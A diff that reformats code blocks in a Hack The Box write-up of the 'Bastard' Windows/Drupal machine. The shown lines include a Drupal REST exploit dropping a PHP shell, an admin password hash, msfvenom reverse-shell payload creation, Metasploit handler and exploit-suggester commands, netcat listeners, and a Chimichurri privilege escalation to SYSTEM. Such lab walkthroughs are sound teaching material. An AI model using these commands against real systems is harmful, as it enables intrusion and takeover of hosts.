@@ -148,7 +148,8 @@ So we can set the endpoint_path variable to $endpoint_path = `‘/rest’;`once 
 - user.json
 - session.json
 
-```user.json
+user.json
+```
 {
  “uid”: “1”,
  “name”: “admin”,
@@ -165,27 +166,20 @@ So we can set the endpoint_path variable to $endpoint_path = `‘/rest’;`once 
  “data”: false,
  “roles”: {
  “2”: “authenticated user”,
- “3”: “administrator”
- },
+ “3”: “administrator”},
  “rdf_mapping”: {
  “rdftype”: [
- “sioc:UserAccount”
- ],
+ “sioc:UserAccount”],
  “name”: {
  “predicates”: [
- “foaf:name”
- ]
- },
+ “foaf:name”]},
  “homepage”: {
  “predicates”: [
- “foaf:page”
- ],
- “type”: “rel”
- }
+ “foaf:page”],
+ “type”: “rel” }
  },
  “pass”: “$S$DRYKUR0xDeqClnV5W0dnncafeE.Wi4YytNcBmmCtwOjrcH5FJSaE”
 }```
-
 session.json
 ```
 {
@@ -201,7 +195,6 @@ $payload1 = fread($myfile,filesize(“payload1.txt”));
 $url = ‘10.10.10.9’;
 $endpoint_path = ‘/rest’;
 $endpoint = ‘rest_endpoint’;
-
  $file = [
  ‘filename’ => ‘ssec.php’,
  ‘data’ => $payload1];
@@ -219,16 +212,16 @@ File written: 10.10.10.9/ssec.php
 `
 Now I can catch the shell with netcat nc -lvp 1234
 
-`Connection from [10.10.10.9] port 1234 [tcp/*] accepted (family 2, sport 49214)
+```Connection from [10.10.10.9] port 1234 [tcp/*] accepted (family 2, sport 49214)
 dir
  Volume in drive C has no label.
  Volume Serial Number is 605B-4AAA
 
 Directory of C:\inetpub\drupal-7.54
-
+```
 Now to get the user flag ..
 
-cd C:\Users\dimitris\Desktop
+```cd C:\Users\dimitris\Desktop
  Directory of C:\Users\dimitris\Desktop
 
 19/03/2017 09:04 �� <DIR> .
@@ -236,7 +229,7 @@ cd C:\Users\dimitris\Desktop
  19/03/2017 09:06 �� 32 user.txt
  1 File(s) 32 bytes
  2 Dir(s) 31.040.098.304 bytes free
-`
+```
 and we **Got The User Flag!**
 
 > Note: when I was trying to catch the shell with metasploit, the session would die instantly I don’t know what was causing this so I moved on without metasploit and used nc instead.
@@ -252,7 +245,8 @@ into a writeable directory.
 
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.9 LPORT=4444 -f exe > ssec.exe`
 
-`Directory of C:\inetpub\drupal-7.54
+```
+Directory of C:\inetpub\drupal-7.54
 
 10/09/2017 09:06 �� <DIR> .
 10/09/2017 09:06 �� <DIR> ..
@@ -288,18 +282,19 @@ into a writeable directory.
 19/03/2017 01:42 �� 417 xmlrpc.php
  23 File(s) 348.601 bytes
  9 Dir(s) 31.039.807.488 bytes free
-`
+```
 I prepared a metasploit handler to receive the incoming windows shell.
 
-use exploit/multi/handler
+`use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <yourip>
 set LPORT <4444>
 set ExitOnSession false
-exploit -j -z
+exploit -j -z`
 
 I executed ssec.exe through b374k’s terminal and got a meterpreter shell.
 
+```
 meterpreter > sysinfo 
 Computer : BASTARD
 OS : Windows 2008 R2 (Build 7600).
@@ -308,7 +303,7 @@ System Language : el_GR
 Domain : HTB
 Logged On Users : 0
 Meterpreter : x86/windows
-
+```
 Now that we have a meterpreter shell we can use exploit suggester for possible privilege scalation on the windows box.  
 
 meterpreter > run post/multi/recon/local_exploit_suggester
@@ -327,26 +322,28 @@ meterpreter > run post/multi/recon/local_exploit_suggester
 
 We got quite a few exploits we could use but only one of them looks promising, ms16_032_secondary logon_handle_privesc. 
 I tried it but that exploit only works if another user logged in as Administrator and in this case no one was logging in.
-`
+```
 [*] Started reverse TCP handler on 10.10.x.x:4444 
 [*] Writing payload file, C:\Users\Public\Documents\test\XEfKVo.txt…
 [*] Compressing script contents…
 [+] Compressed size: 3588
 [*] Executing exploit script…
 [*] Exploit completed, but no session was created.
-`
+```
 I kept digging the inter-webs and came across this exploit on github https://github.com/Re4son/Chimichurri/
 
 Now that we have a meterpreter shell we can use the upload function built in metasploit. I uploaded Chimichurri.exe to `C:\inetpub\drupal-7.54\`
 
 Started a netcat listener on my host machine
 
-`$ nc -lvp 5555
+```
+$ nc -lvp 5555
 Listening on [0.0.0.0] (family 0, port 5555)
-
+```
 and on metasploit I ran Chimichurri.exe <my ip> 5555
 I got another shell but this time as root.
 
+```
 Connection from [10.10.10.9] port 5555 [tcp/*] accepted (family 2, sport 49314)
 Microsoft Windows [Version 6.1.7600]
 Copyright © 2009 Microsoft Corporation. All rights reserved.
@@ -360,7 +357,7 @@ Directory of C:\Users\Administrator\Desktop
 19/03/2017 08:34 �� 32 root.txt.txt
  1 File(s) 32 bytes
  2 Dir(s) 31.039.451.136 bytes free
-`
+```
 and we Got The Root Flag!
 ![](https://gph.is/2alsxtt)
 I really enjoyed this box but in some parts I was struggling that’s why I had to use b374k’s shell if someone else did it differently I would love to hear how you achieved to upload a file to the victim machine. I’m happy to announce that this my very first writeup I’ve ever done.
